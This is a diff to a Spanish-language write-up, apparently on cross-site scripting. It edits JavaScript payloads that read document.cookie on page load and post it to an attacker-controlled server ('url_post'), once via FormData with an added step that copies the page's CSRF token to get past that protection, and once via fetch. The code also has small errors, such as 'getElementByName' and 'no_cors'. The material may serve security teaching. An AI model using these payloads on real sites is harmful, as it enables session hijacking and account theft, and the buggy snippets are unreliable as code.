@@ -5,8 +5,9 @@ En este caso cuando se inyecta el código JavaScript  el cual se encarga de envi
 window.addEventListener('DOMContentLoaded', function(){
 
 var data = FormData();
+var token = document.getElementByName('csrf')[0].value
 
-data.append('parametro1', "valor1");
+data.append('csrf', token);
 data.append('parametro2', document.cookie); // <- Robo de cookie
 data.append('parametro3', "valor3");
 data.append('parametro4', "valor4");
@@ -27,7 +28,7 @@ En caso de que haya un servidor publico que podamos usar como atacantes, el cód
 window.addEventListener('DOMContentLoaded', function(){
 
 fetch('url_post', {
-	method: 'Post',
+	method: 'POST',
 	mode: 'no_cors',
 	body: document.cookie
 
